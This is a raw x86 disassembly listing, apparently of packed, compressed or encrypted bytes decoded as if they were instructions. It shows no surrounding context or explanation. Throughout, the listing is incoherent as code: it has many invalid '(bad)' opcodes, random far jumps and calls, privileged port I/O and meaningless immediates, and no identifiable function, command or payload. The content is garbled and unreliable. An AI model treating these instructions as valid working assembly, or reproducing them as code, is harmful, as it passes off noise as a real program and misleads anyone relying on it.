  417a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a36:	(bad)  
  417a38:	and    esi,0xffffffe1
  417a3b:	adc    bh,BYTE PTR [eax-0x190bd0b7]
  417a41:	push   edi
  417a42:	mov    bl,0x3f
  417a44:	pusha  
  417a45:	sbb    DWORD PTR [ebx+0x3e],ecx
  417a48:	push   eax
  417a49:	jl     0x417a69
  417a4b:	call   0x6b64356a
  417a50:	(bad)  
  417a51:	cmp    eax,DWORD PTR [ebx]
  417a53:	dec    ebx
  417a54:	bound  esp,QWORD PTR [ebp-0x30d2a87c]
  417a5a:	ds aaa 
  417a5c:	(bad)  
  417a5d:	lahf   
  417a5e:	daa    
  417a5f:	in     al,0xb1
  417a61:	push   eax
  417a62:	sub    bl,BYTE PTR [edx-0x643f4bcc]
  417a68:	mov    BYTE PTR [eax-0x49],dl
  417a6b:	ror    esp,cl
  417a6d:	je     0x417a74
  417a6f:	mov    ds:0x27af289d,eax
  417a74:	mov    al,0x27
  417a76:	lock dec esp
  417a78:	cs into 
  417a7a:	or     BYTE PTR [edi-0x7c],dh
  417a7d:	xor    edx,esp
  417a7f:	(bad)  
  417a80:	das    
  417a81:	fdivr  QWORD PTR [ebp-0x21]
  417a84:	(bad)
  417a88:	daa    
  417a89:	push   edx
  417a8a:	arpl   WORD PTR [ecx+0x57be6d16],si
  417a90:	push   eax
  417a91:	xor    BYTE PTR [ecx+0x31],cl
  417a94:	sub    eax,0xc67792c6
  417a99:	into   
  417a9a:	xor    eax,0x76bdfc2d
  417a9f:	xor    edx,DWORD PTR [eax]
  417aa1:	mov    cl,0x33
  417aa3:	jl     0x417a40
  417aa5:	icebp  
  417aa6:	dec    ebp
  417aa7:	and    BYTE PTR [edi+0x555176a2],bh
  417aad:	out    0xd0,al
  417aaf:	dec    ebp
  417ab0:	shl    DWORD PTR [esi-0x69],0xa5
  417ab4:	sahf   
  417ab5:	pop    ss
  417ab6:	sti    
  417ab7:	xor    esp,DWORD PTR [ecx-0x306e798a]
  417abd:	push   ss
  417abe:	cmp    DWORD PTR [ebp+0x2001a1a8],ebx
  417ac4:	sub    ecx,DWORD PTR [edi-0x18]
  417ac7:	imul   bh
  417ac9:	mov    al,ds:0x6d591e70
  417ace:	or     eax,0xcdb81333
  417ad3:	sbb    edx,ebp
  417ad5:	std    
  417ad6:	and    al,0x95
  417ad8:	std    
  417ad9:	int3   
  417ada:	jb     0x417aea
  417adc:	pop    ecx
  417add:	xchg   edi,eax
  417ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417adf:	cmp    dl,ch
  417ae1:	ins    BYTE PTR es:[edi],dx
  417ae2:	push   ebx
  417ae3:	jge    0x417ac8
  417ae5:	addr16 dec ebp
  417ae7:	mov    bh,0xcc
  417ae9:	daa    
  417aea:	adc    DWORD PTR [edi-0x37820ccc],0xffffffd9
  417af1:	dec    ecx
  417af2:	test   DWORD PTR [eax],0x6fab5f35
  417af8:	jo     0x417af6
  417afa:	ds xchg ebx,eax
  417afc:	inc    ebp
  417afd:	mov    DWORD PTR [ecx+0x5b],edi
  417b00:	dec    esp
  417b01:	jmp    0xc8fc:0x5ed81d31
  417b08:	xchg   edx,esp
  417b0a:	mov    ds:0xe335f221,al
  417b0f:	jns    0x417b7b
  417b11:	es dec esp
  417b13:	xchg   edx,eax
  417b14:	test   DWORD PTR [edx],0x648aeb37
  417b1a:	loop   0x417b65
  417b1c:	jo     0x417b42
  417b1e:	mov    ch,0x7f
  417b20:	fdivp  st(6),st
  417b22:	mov    edx,0x772f9dda
  417b27:	mov    ebx,0x2ce1fbb3
  417b2c:	xor    BYTE PTR [esi],al
  417b2e:	fsub   QWORD PTR [ebx-0x169cd31a]
  417b34:	test   DWORD PTR [ebp-0x713a8ac3],edx
  417b3a:	and    DWORD PTR [edi+0x5ff26a92],esi
  417b40:	loope  0x417b39
  417b42:	lods   eax,DWORD PTR ds:[esi]
  417b43:	sbb    DWORD PTR [ecx+0x46],esi
  417b46:	sub    eax,0xb725ebb2
  417b4b:	pop    esi
  417b4c:	mov    al,ds:0x1070278e
  417b51:	mov    esi,0x77eee62
  417b56:	imul   esp,DWORD PTR [eax],0x39
  417b59:	aad    0x2c
  417b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b5c:	sub    BYTE PTR [eax+0x1c],bh
  417b5f:	mov    esi,0x55ae2044
  417b64:	scas   eax,DWORD PTR es:[edi]
  417b65:	repz push ebx
  417b67:	(bad)  
  417b68:	xlat   BYTE PTR ds:[ebx]
  417b69:	cli    
  417b6a:	inc    edx
  417b6b:	imul   ebx,DWORD PTR [eax-0x17],0xf70de0b3
  417b72:	xlat   BYTE PTR ds:[ebx]
  417b73:	pop    ds
  417b74:	pop    ecx
  417b75:	push   es
  417b76:	push   ebx
  417b77:	xlat   BYTE PTR ds:[ebx]
  417b78:	jne    0x417b4d
  417b7a:	mov    ch,BYTE PTR [ebx]
  417b7c:	test   eax,0xf5935cb
  417b81:	jo     0x417b89
  417b83:	push   edi
  417b84:	lds    ecx,FWORD PTR [esi+0x75de38a8]
  417b8a:	jmp    0x417b16
  417b8c:	cmp    bl,BYTE PTR [ebx-0xa]
  417b8f:	and    ebp,DWORD PTR [ecx-0x43]
  417b92:	fsubr  QWORD PTR [ecx+0x6e]
  417b95:	jnp    0x417c15
  417b97:	imul   esi,DWORD PTR ds:0xdc0d75c8,0xa
  417b9e:	(bad)  
  417b9f:	push   ebp
  417ba0:	add    eax,0x2fb7f4bf
  417ba5:	add    al,0xc3
  417ba7:	pop    ds
  417ba8:	or     al,BYTE PTR [eax-0x3633c829]
  417bae:	ficom  DWORD PTR [ecx]
  417bb0:	or     BYTE PTR [ebx+0x76],bh
  417bb3:	sub    DWORD PTR [ecx-0x21e33635],0x19
  417bba:	dec    ebx
  417bbb:	sub    esp,DWORD PTR [edi+ebx*4]
  417bbe:	icebp  
  417bbf:	cs pop edx
  417bc1:	inc    ebp
  417bc2:	repnz repnz inc eax
  417bc5:	loopne 0x417bed
  417bc7:	add    ebp,ebx
  417bc9:	jecxz  0x417b80
  417bcb:	(bad)  
  417bcc:	jb     0x417c3f
  417bce:	sub    eax,0x9debf6d1
  417bd3:	push   edx
  417bd4:	jnp    0x417c49
  417bd6:	xor    ecx,DWORD PTR [edi-0x14]
  417bd9:	mov    edi,0x99d75530
  417bde:	xchg   ebp,eax
  417bdf:	sti    
  417be0:	dec    edi
  417be1:	mov    ecx,DWORD PTR [ecx+0x2a]
  417be4:	mov    edi,?
  417be6:	jl     0x417b80
  417be8:	fstp   TBYTE PTR [edi+ebp*1+0x16bfedef]
  417bef:	adc    al,0x57
  417bf1:	xchg   edi,eax
  417bf2:	jmp    0x87c5:0x6819556d
  417bf9:	mov    BYTE PTR [eax],al
  417bfb:	out    0x64,al
  417bfd:	mov    al,ds:0xa154e21d
  417c02:	mov    ebx,fs
  417c04:	pop    bp
  417c06:	(bad)  
  417c07:	leave  
  417c08:	outs   dx,DWORD PTR ds:[esi]
  417c09:	(bad)  
  417c0a:	jno    0x417c19
  417c0c:	jp     0x417bac
  417c0e:	ret    0xb14f
  417c11:	cmp    ah,BYTE PTR [edi+0x3418e870]
  417c17:	mov    ebp,0x114f12b
  417c1c:	popa   
  417c1d:	jo     0x417bd7
  417c1f:	sub    eax,ebx
  417c21:	lea    edx,[edi+0x22796b93]
  417c27:	add    al,0xff
  417c29:	pop    ebx
  417c2a:	aad    0x5f
  417c2c:	fst    QWORD PTR [edx]
  417c2e:	(bad)  
  417c2f:	sub    DWORD PTR [eax-0x23083fcf],edx
  417c35:	out    0x67,eax
  417c37:	add    al,0x98
  417c39:	ret    
  417c3a:	in     al,0x3d
  417c3c:	mov    eax,0x1250a620
  417c41:	dec    edi
  417c42:	cmp    DWORD PTR [ebp+esi*2+0x2f],esi
  417c46:	push   ebx
  417c47:	dec    ebp
  417c48:	sbb    al,0xba
  417c4a:	ret    
  417c4b:	arpl   WORD PTR [eax+0x70056a2d],bx
  417c51:	lahf   
  417c52:	inc    eax
  417c53:	push   esi
  417c54:	sub    cl,BYTE PTR [eax]
  417c56:	add    eax,0x4341904b
  417c5b:	push   eax
  417c5c:	aaa    
  417c5d:	(bad)  
  417c5e:	sub    DWORD PTR [esp+ecx*4],esi
  417c61:	shl    BYTE PTR [edx-0x32],0x12
  417c65:	call   0x6135:0xd3418afc
  417c6c:	pop    ebp
  417c6d:	jge    0x417c1b
  417c6f:	cld    
  417c70:	jo     0x417c56
  417c72:	mov    dh,BYTE PTR ds:[ebx]
  417c75:	mov    eax,0xbcace7d1
  417c7a:	and    eax,0x4ace749
  417c7f:	pop    edx
  417c80:	retf   0x6bb2
  417c83:	gs mov ecx,0xb21c8d72
  417c89:	dec    ebp
  417c8a:	pop    ecx
  417c8b:	pop    edi
  417c8c:	inc    ebp
  417c8d:	sbb    edi,esp
  417c8f:	push   esp
  417c90:	mov    ds:0xa624bd3,eax
  417c95:	ja     0x417cab
  417c97:	jno    0x417c5e
  417c99:	jmp    0xd0d:0x4905ed7c
  417ca0:	ds clc 
  417ca2:	ret    0x41fb
  417ca5:	movhps QWORD PTR [ebx+edx*2-0x8],xmm0
  417caa:	push   esp
  417cab:	xor    eax,0x25f2f976
  417cb1:	or     al,0x41
  417cb3:	jp     0x417d33
  417cb5:	push   0xe9d389c8
  417cba:	jl     0x417c40
  417cbc:	in     al,0xaa
  417cbe:	ja     0x417cdb
  417cc0:	imul   esp,DWORD PTR [edx+0x325bbee7],0xffffffb6
  417cc7:	loope  0x417cd0
  417cc9:	sub    DWORD PTR [eax],esp
  417ccb:	shl    BYTE PTR [ecx],cl
  417ccd:	xor    BYTE PTR [eax],al
  417ccf:	repnz sahf 
  417cd1:	mov    al,ds:0xb8ae06b4
  417cd6:	adc    DWORD PTR fs:[edx+0x7e],ebp
  417cda:	aaa    
  417cdb:	pop    edx
  417cdc:	pop    edx
  417cdd:	dec    ebp
  417cde:	push   ecx
  417cdf:	jnp    0x417d3f
  417ce1:	mov    WORD PTR [edi-0x4b],fs
  417ce4:	ja     0x417d2e
  417ce6:	sub    eax,0x719e1877
  417ceb:	ret    0x4ec9
  417cee:	xchg   esi,eax
  417cef:	mov    ecx,0x2712a1d3
  417cf4:	xchg   ebp,eax
  417cf5:	cmp    BYTE PTR [edx],dh
  417cf7:	add    dh,al
  417cf9:	lods   al,BYTE PTR ds:[esi]
  417cfa:	test   DWORD PTR [eax-0x41],0x6311d28c
  417d01:	xor    BYTE PTR [edi],0x45
  417d04:	cwde   
  417d05:	or     DWORD PTR ds:0x30f1e5f9,ebx
  417d0b:	jo     0x417d31
  417d0d:	mov    ds:0x3f2e5a0c,eax
  417d12:	dec    esp
  417d13:	cmp    al,0x2d
  417d15:	aam    0x83
  417d17:	stc    
  417d18:	mov    eax,ds:0x461b10b9
  417d1d:	dec    eax
  417d1e:	ins    BYTE PTR es:[edi],dx
  417d1f:	std    
  417d20:	pop    ebp
  417d21:	jae    0x417d81
  417d23:	punpcklbw mm7,mm5
  417d26:	imul   esp,DWORD PTR [eax-0x21635ab4],0x82275fbf
  417d30:	or     BYTE PTR [ecx-0x2a34bbcb],dh
  417d36:	and    BYTE PTR [ecx+0x1a],cl
  417d39:	inc    esp
  417d3a:	mov    dh,0x6b
  417d3c:	in     al,dx
  417d3d:	sti    
  417d3e:	mov    ds:0xca178901,al
  417d43:	mov    ch,0xf8
  417d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d46:	cmp    eax,0x6e5f0544
  417d4b:	les    edx,FWORD PTR gs:[esp+ecx*1-0x56ed64c6]
  417d53:	int    0x75
  417d55:	push   ebp
  417d56:	ja     0x417d26
  417d58:	push   cs
  417d59:	dec    edi
  417d5a:	adc    ebx,DWORD PTR es:[ebx-0x80ba324]
  417d61:	retf   0x6a10
  417d64:	leave  
  417d65:	scas   eax,DWORD PTR es:[edi]
  417d66:	shl    BYTE PTR [ecx],cl
  417d68:	dec    esp
  417d69:	jnp    0x417dc3
  417d6b:	sahf   
  417d6c:	inc    edi
  417d6d:	mov    al,0xf7
  417d6f:	push   ss
  417d70:	push   es
  417d71:	dec    ebp
  417d72:	push   esp
  417d73:	enter  0x6b41,0x68
  417d77:	fdiv   QWORD PTR [edi+0x21]
  417d7a:	mov    ah,0x84
  417d7c:	out    dx,eax
  417d7d:	jnp    0x417d62
  417d7f:	popf   
  417d80:	mov    bh,0x30
  417d82:	cdq    
  417d83:	sub    dh,BYTE PTR [ebx+ebp*2-0x570edc75]
  417d8a:	xchg   bh,cl
  417d8c:	jge    0x417d57
  417d8e:	fld    st(6)
  417d90:	cmp    ah,BYTE PTR cs:[ebx]
  417d93:	cmp    edx,edx
  417d95:	inc    ebp
  417d96:	push   ebp
  417d97:	sbb    BYTE PTR [edx+0x6b],cl
  417d9a:	dec    esp
  417d9b:	inc    ebp
  417d9c:	fdiv   st,st(3)
  417d9e:	mov    bl,0x3b
  417da0:	dec    ebp
  417da1:	push   ds
  417da2:	sbb    esp,DWORD PTR [esi+0x21a54c25]
  417da8:	push   ds
  417da9:	pop    ecx
  417daa:	push   0x4b
  417dac:	lea    edi,[esi+esi*1-0x361f03fa]
  417db3:	dec    BYTE PTR [ebp-0x1e1909c1]
  417db9:	loopne 0x417df0
  417dbb:	fwait
  417dbc:	in     eax,dx
  417dbd:	dec    edi
  417dbe:	dec    ebp
  417dbf:	pop    edi
  417dc0:	ins    BYTE PTR es:[edi],dx
  417dc1:	adc    BYTE PTR [ecx-0x5a],bl
  417dc4:	push   ds
  417dc5:	push   0x44
  417dc7:	xor    al,0xfa
  417dc9:	or     al,0x7e
  417dcb:	pop    ecx
  417dcc:	push   ds
  417dcd:	jnp    0x417e05
  417dcf:	dec    esp
  417dd0:	pop    ebp
  417dd1:	pushf  
  417dd2:	jge    0x417d9d
  417dd4:	xchg   ecx,eax
  417dd5:	bnd data16 jno 0x417df9
  417dd9:	mov    ah,0x25
  417ddb:	sbb    dh,BYTE PTR [eax-0x1835d1c3]
  417de1:	in     al,0xdd
  417de3:	sbb    edx,esi
  417de5:	mov    ah,0x9a
  417de7:	(bad)  
  417de8:	imul   ebp,edx,0x4f
  417deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dec:	out    0xc6,al
  417dee:	mov    dl,0xc
  417df0:	int3   
  417df1:	sbb    ebp,0xb0132744
  417df7:	cmp    edi,ebx
  417df9:	lods   al,BYTE PTR ds:[esi]
  417dfa:	test   al,0x9c
  417dfc:	mov    edi,0x2cd346fe
  417e01:	adc    al,0x40
  417e03:	xor    ch,cl
  417e05:	pop    esp
  417e06:	outs   dx,BYTE PTR ds:[esi]
  417e07:	fcmovnb st,st(2)
  417e09:	dec    esi
  417e0a:	pop    ds
  417e0b:	lock ret 
  417e0d:	push   ebx
  417e0e:	mov    cs,WORD PTR [ebx+edx*8-0x6f]
  417e12:	popa   
  417e13:	jno    0x417e8f
  417e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e16:	inc    ebx
  417e17:	sub    eax,0x422f59a4
  417e1c:	xchg   edx,eax
  417e1d:	popf   
  417e1e:	mov    fs,ebx
  417e20:	inc    esp
  417e21:	outs   dx,BYTE PTR ds:[esi]
  417e22:	xchg   ecx,eax
  417e23:	xor    DWORD PTR [edi-0x48],ebx
  417e26:	imul   ebp,DWORD PTR [ecx-0x3],0x13
  417e2a:	ss cwde 
  417e2c:	add    al,0xd4
  417e2e:	and    al,0x47
  417e30:	mov    cs,WORD PTR ds:0x1006cb5d
  417e36:	xchg   ebx,eax
  417e37:	inc    edi
  417e38:	xchg   esp,eax
  417e39:	in     al,dx
  417e3a:	pop    esp
  417e3b:	adc    BYTE PTR [edi-0x739722e],ah
  417e41:	jg     0x417e94
  417e43:	sbb    DWORD PTR [ebp+0x7ea53d71],0x664922c3
  417e4d:	xchg   ebx,eax
  417e4e:	mov    esp,0x3d066fa9
  417e53:	dec    edx
  417e54:	inc    ebp
  417e55:	push   ebp
  417e56:	sub    BYTE PTR ds:0x43a3aa0f,bh
  417e5c:	ret    
  417e5d:	cmp    eax,0xd49f7d16
  417e62:	in     al,dx
  417e63:	ins    DWORD PTR es:[edi],dx
  417e64:	pop    eax
  417e65:	adc    BYTE PTR [eax-0x77e14ed1],dl
  417e6b:	adc    ecx,ebp
  417e6d:	gs xchg ecx,eax
  417e6f:	in     al,0xda
  417e71:	sub    BYTE PTR [eax+0x2f38f28c],ah
  417e77:	pop    ss
  417e78:	addr16 pop eax
  417e7a:	and    dl,bh
  417e7c:	mov    esp,0xe706ece4
  417e81:	pop    es
  417e82:	shr    cl,1
  417e84:	mov    ch,0xfd
  417e86:	(bad)  
  417e87:	cmp    bh,BYTE PTR [edx]
  417e89:	icebp  
  417e8a:	pop    es
  417e8b:	xor    BYTE PTR [ecx],bl
  417e8d:	jne    0x417e31
  417e8f:	xchg   edx,eax
  417e90:	cmp    BYTE PTR [ebx-0x2c5c823a],al
  417e96:	fild   QWORD PTR [edi-0x3dbe3000]
  417e9c:	push   cs
  417e9d:	sti    
  417e9e:	inc    ebx
  417e9f:	sbb    dh,dl
  417ea1:	int3   
  417ea2:	bound  esi,QWORD PTR [eax-0x6e36c5cb]
  417ea8:	mov    ds:0xce287bdb,eax
  417ead:	add    BYTE PTR [eax],al
  417eaf:	add    BYTE PTR [eax],al
  417eb1:	add    dl,al
  417eb3:	sahf   
  417eb4:	xchg   ebx,eax
  417eb5:	inc    edi
  417eb6:	fisttp WORD PTR [edi-0x2a]
  417eb9:	lahf   
  417eba:	int    0x45
  417ebc:	push   eax
  417ebd:	setb   BYTE PTR [esi-0x3c]
  417ec1:	out    dx,eax
  417ec2:	adc    esp,edi
  417ec4:	add    BYTE PTR [eax],al
  417ec6:	repz add al,0x0
  417ec9:	add    BYTE PTR [ebp+0x15],ch
  417ecc:	stos   DWORD PTR es:[edi],eax
  417ecd:	retf   0xcafb
  417ed0:	adc    eax,DWORD PTR [edi+ecx*2]
  417ed3:	popa   
  417ed4:	retf   0x292
  417ed7:	mov    ebp,0xac2f47f3
  417edc:	push   cs
  417edd:	ins    BYTE PTR es:[edi],dx
  417ede:	sub    DWORD PTR [esi],ebx
  417ee0:	in     al,dx
  417ee1:	add    DWORD PTR ds:0x1c689d1e,ebp
  417ee7:	inc    edx
  417ee8:	sbb    DWORD PTR [edx+eax*2-0x27],edi
  417eec:	pop    esp
  417eed:	bound  edx,QWORD PTR [ebx-0x7b69fa3a]
  417ef3:	sub    eax,0x4f152a3d
  417ef8:	xchg   ebp,eax
  417ef9:	push   ds
  417efa:	pop    edx
  417efb:	out    dx,eax
  417efc:	mov    DWORD PTR [edx],edi
  417efe:	sbb    DWORD PTR [ebx],esp
  417f00:	xor    bl,BYTE PTR [ebx+0x21fe218c]
  417f06:	lods   eax,DWORD PTR ds:[esi]
  417f07:	xchg   ebp,eax
  417f08:	and    BYTE PTR [eax-0x4e57d429],0x98
  417f0f:	repnz cmp esi,DWORD PTR [edx-0x37]
  417f13:	div    DWORD PTR [esi-0x19]
  417f16:	aad    0x70
  417f18:	push   ebp
  417f19:	cld    
  417f1a:	repz and al,0x6b
  417f1d:	fld    QWORD PTR [esi+0x3fdce1e3]
  417f23:	stos   DWORD PTR es:[edi],eax
  417f24:	fist   WORD PTR [edi+ecx*4+0x3]
  417f28:	arpl   WORD PTR [ebp-0x54],si
  417f2b:	mov    dl,0xe1
  417f2d:	ret    
  417f2e:	iret   
  417f2f:	mov    eax,ds:0xa2f1647b
  417f34:	xchg   ebx,eax
  417f35:	mov    ebp,0xc35d8636
  417f3a:	lock ins BYTE PTR es:[edi],dx
  417f3c:	leave  
  417f3d:	enter  0x1a3b,0xd3
  417f41:	fwait
  417f42:	sbb    DWORD PTR [ebx],ebx
  417f44:	sbb    DWORD PTR [ebx-0x1c],edx
  417f47:	stos   BYTE PTR es:[edi],al
  417f48:	jo     0x417f2f
  417f4a:	xchg   edi,eax
  417f4b:	sbb    bh,ah
  417f4d:	xchg   ebx,eax
  417f4e:	pop    ss
  417f4f:	js     0x417efa
  417f51:	ins    BYTE PTR es:[edi],dx
  417f52:	mov    al,ds:0xa41d14cd
  417f57:	dec    edi
  417f58:	xor    eax,0x9e442d63
  417f5d:	loopne 0x417fde
  417f5f:	sbb    DWORD PTR [ebp-0x20e9b0de],esi
  417f65:	push   edi
  417f66:	pop    edi
  417f67:	repnz mov ah,0x84
  417f6a:	mov    ch,0xf3
  417f6c:	push   ebp
  417f6d:	(bad)  
  417f6e:	push   ebx
  417f6f:	out    0x51,al
  417f71:	add    eax,0x27011093
  417f76:	xor    al,0x18
  417f79:	adc    esp,ebp
  417f7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f7c:	dec    eax
  417f7d:	hlt    
  417f7e:	in     eax,0x39
  417f80:	cs push ss
  417f82:	loope  0x417f3a
  417f84:	ss jbe 0x417f58
  417f87:	gs pop ds
  417f89:	push   0x8b47a6f8
  417f8e:	outs   dx,BYTE PTR ds:[esi]
  417f8f:	in     eax,0x45
  417f91:	sub    al,0x31
  417f93:	inc    edi
  417f94:	sbb    DWORD PTR [ecx+0x49b98371],0x2e
  417f9b:	test   BYTE PTR [edx],al
  417f9d:	(bad)  
  417f9e:	pop    esp
  417f9f:	nop
  417fa0:	and    ebp,esp
  417fa2:	xor    DWORD PTR [ebx],ecx
  417fa4:	mov    dh,0xaf
  417fa6:	add    cl,BYTE PTR [edx]
  417fa8:	cld    
  417fa9:	sub    bh,ah
  417fab:	les    ebx,FWORD PTR ds:0xb4071a76
  417fb1:	shl    DWORD PTR [ebx+0x1b],cl
  417fb4:	push   esi
  417fb5:	mov    eax,ds:0x4d048434
  417fba:	pop    ecx
  417fbb:	or     al,0x6c
  417fbd:	cmp    dh,dl
  417fbf:	jno    0x41803b
  417fc1:	icebp  
  417fc2:	push   ecx
  417fc3:	mov    edi,0xaae43ec8
  417fc8:	sahf   
  417fc9:	(bad)  
  417fca:	jecxz  0x41801b
  417fcc:	add    edx,esi
  417fce:	or     BYTE PTR [edi+esi*1],bh
  417fd1:	add    edx,ebp
  417fd3:	ret    
  417fd4:	daa    
  417fd5:	stc    
  417fd6:	fucomip st,st(0)
  417fd8:	fmulp  st(6),st
  417fda:	out    0xaa,al
  417fdc:	gs jo  0x41805c
  417fdf:	mov    ds:0x5095a75c,al
  417fe4:	push   esp
  417fe5:	cmp    bl,BYTE PTR [eax]
  417fe7:	stos   BYTE PTR es:[edi],al
  417fe8:	cmp    eax,0xabb14238
  417fed:	je     0x418021
  417fef:	mov    dh,0x57
  417ff1:	push   eax
  417ff2:	not    DWORD PTR [ecx+0x41cedbc2]
  417ff8:	sbb    al,0xd2
  417ffa:	mov    BYTE PTR [ecx-0x59bf0fa8],dl
  418000:	cmp    DWORD PTR [ecx+eax*8-0x44],esi
  418004:	xchg   BYTE PTR ds:0x7418d257,ch
  41800a:	in     al,dx
  41800b:	je     0x417fb9
  41800d:	sbb    al,0xe1
  41800f:	jbe    0x41805a
  418011:	call   0x3ec3a51
  418016:	dec    eax
  418017:	mov    ah,0x85
  418019:	and    DWORD PTR [edx+0x6a],eax
  41801c:	gs cmp al,0x35
  41801f:	js     0x417fd1
  418021:	push   0xffffffe5
  418023:	mov    ecx,0xead795e6
  418028:	dec    edx
  418029:	xchg   ebp,edi
  41802b:	jns    0x418055
  41802d:	adc    al,0x37
  41802f:	or     al,0x27
  418031:	test   esi,ebx
  418033:	and    al,0x61
  418035:	mov    dh,0x81
  418037:	or     eax,0x86365464
  41803c:	iret   
  41803d:	mov    eax,DWORD PTR [ebx+eax*2]
  418040:	lds    ebp,FWORD PTR [esi+eiz*4-0x34]
  418044:	icebp  
  418045:	lea    edx,[esi+ebp*2]
  418048:	jo     0x418048
  41804a:	call   0xa1f281ee
  41804f:	jnp    0x418022
  418051:	xlat   BYTE PTR ds:[ebx]
  418052:	cwde   
  418053:	inc    eax
  418054:	out    dx,eax
  418055:	dec    ecx
  418056:	xlat   BYTE PTR ds:[ebx]
  418057:	cmp    ebx,DWORD PTR [edx]
  418059:	sub    al,0x10
  41805b:	call   0xd84e:0xc26ea19e
  418062:	mov    DWORD PTR [edi+0x2d],edi
  418065:	sbb    eax,0x72aade8b
  41806a:	shr    BYTE PTR [esi-0x113029f4],0x58
  418071:	in     al,0x4f
  418073:	test   eax,0x506b37ae
  418078:	test   eax,0x65205394
  41807d:	or     BYTE PTR [edx-0x335fd6da],0x25
  418084:	jle    0x41807d
  418086:	cdq    
  418087:	xchg   esi,eax
  418088:	jg     0x4180f1
  41808a:	fstp   QWORD PTR [edi-0x79]
  41808d:	mov    bh,0x52
  41808f:	pop    edx
  418090:	sbb    al,0x6c
  418092:	pop    esp
  418093:	iret   
  418094:	mov    esp,0xcafacb0a
  418099:	add    DWORD PTR [edx+0x20ee91eb],0x1a1bba1b
  4180a3:	inc    ebx
  4180a4:	test   DWORD PTR [edi+0x4],ecx
  4180a7:	xchg   ecx,eax
  4180a8:	or     eax,0x44f582e8
  4180ad:	loop   0x418102
  4180af:	xor    BYTE PTR ds:0x2aefc834,bl
  4180b5:	sub    al,BYTE PTR [ecx-0x54]
  4180b8:	jp     0x418050
  4180ba:	pop    edi
  4180bb:	adc    esi,DWORD PTR [esi+ecx*4]
  4180be:	mov    dh,0x7f
  4180c0:	mov    WORD PTR [edi],cs
  4180c2:	aad    0x94
  4180c4:	jmp    0x1893:0x3b8a3fb5
  4180cb:	rcr    ebx,cl
  4180cd:	jbe    0x418106
  4180cf:	mov    eax,DWORD PTR [esi-0x33]
  4180d2:	aam    0x5
  4180d4:	outs   dx,BYTE PTR ds:[esi]
  4180d5:	ins    DWORD PTR es:[edi],dx
  4180d6:	push   esp
  4180d7:	adc    eax,0xc09538a3
  4180dc:	inc    eax
  4180dd:	and    eax,0xc1d42850
  4180e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180e3:	leave  
  4180e4:	jo     0x4180a6
  4180e6:	es inc esi
  4180e8:	dec    ecx
  4180e9:	mov    ah,0xef
  4180eb:	mov    ecx,0xbdc22363
  4180f0:	adc    eax,0xd266a72
  4180f5:	dec    esp
  4180f6:	xchg   ebx,eax
  4180f7:	pop    esp
  4180f8:	out    0xc9,eax
  4180fa:	mov    ebx,0xd11a1b5d
  4180ff:	stos   DWORD PTR es:[edi],eax
  418100:	and    edi,DWORD PTR [esi+0x54]
  418103:	das    
  418104:	mov    eax,ds:0x8cb751ac
  418109:	push   esi
  41810a:	enter  0x75de,0xaa
  41810e:	ja     0x41810a
  418110:	inc    ebp
  418111:	add    DWORD PTR [edx],edx
  418113:	outs   dx,DWORD PTR ds:[esi]
  418114:	add    ebx,DWORD PTR [ebx]
  418116:	dec    edx
  418117:	ja     0x4180ae
  418119:	test   eax,0xabe72c7
  41811e:	pop    ebp
  41811f:	int    0xbf
  418121:	jno    0x418111
  418123:	adc    cl,BYTE PTR [ebx+eax*4+0x145b17ac]
  41812a:	inc    ebx
  41812b:	push   ds
  41812c:	jne    0x418177
  41812e:	jns    0x4181a5
  418130:	mov    ch,0xbf
  418132:	stc    
  418133:	ss dec ebx
  418135:	daa    
  418136:	pop    ebx
  418137:	nop
  418138:	or     BYTE PTR ds:0x9e2d8432,dl
  41813e:	add    al,0xc9
  418140:	movups xmm6,xmm2
  418143:	dec    ebp
  418144:	push   0xfffffff9
  418146:	mov    ecx,edi
  418148:	inc    edx
  418149:	dec    ebx
  41814a:	add    bl,ah
  41814c:	push   cs
  41814d:	mov    ecx,DWORD PTR [eax]
  41814f:	mov    DWORD PTR [edi+0x6c],edx
  418152:	adc    bl,BYTE PTR [ebx+0x61]
  418155:	cmp    ah,BYTE PTR [edi-0x53643d91]
  41815b:	out    0xe2,eax
  41815d:	xlat   BYTE PTR ds:[ebx]
  41815e:	pop    ss
  41815f:	mov    eax,ds:0x283e01e4
  418164:	push   esi
  418165:	in     eax,0x43
  418167:	xchg   esi,eax
  418168:	scas   eax,DWORD PTR es:[edi]
  418169:	mov    esi,0x4a3cfb12
  41816e:	lods   al,BYTE PTR ds:[esi]
  41816f:	sbb    DWORD PTR [edi],edx
  418171:	add    DWORD PTR [ebp-0x3a],0x55a4093f
  418178:	mov    ebp,0x71f5aeb9
  41817d:	retf   
  41817e:	sbb    ecx,edi
  418180:	test   DWORD PTR [ebp+ecx*2-0x33],eax
  418184:	into   
  418185:	data16 (bad) 
  418188:	jb     0x418209
  41818a:	retf   
  41818b:	in     al,0xa
  41818d:	cmp    DWORD PTR [edx+0x221bee58],ecx
  418193:	clc    
  418194:	jae    0x418146
  418196:	outs   dx,BYTE PTR ds:[esi]
  418197:	in     al,dx
  418198:	gs inc ebp
  41819a:	push   0x9
  41819c:	cmp    ch,cl
  41819e:	nop
  41819f:	jle    0x4181fa
  4181a1:	mov    DWORD PTR [edi-0x622ea6a5],ebx
  4181a7:	mov    al,ds:0xf5e32c17
  4181ac:	mov    dh,0x56
  4181ae:	dec    edi
  4181af:	lds    eax,FWORD PTR [edi-0x4f]
  4181b2:	repz pushf 
  4181b4:	aaa    
  4181b5:	shr    DWORD PTR [edx-0x4865e36e],cl
  4181bb:	mov    cl,0x3e
  4181bd:	push   ss
  4181be:	push   cs
  4181bf:	dec    ecx
  4181c0:	push   ds
  4181c1:	imul   ebx,DWORD PTR [esp+edi*4-0x21d12558],0x8bf66289
  4181cc:	mov    DWORD PTR [edi+0x1],esp
  4181cf:	shl    DWORD PTR [edx+0x268b4241],cl
  4181d5:	push   ebx
  4181d6:	mov    eax,0xefb485d1
  4181db:	repnz cwde 
  4181dd:	push   ds
  4181de:	pushf  
  4181df:	inc    edi
  4181e0:	pop    ebp
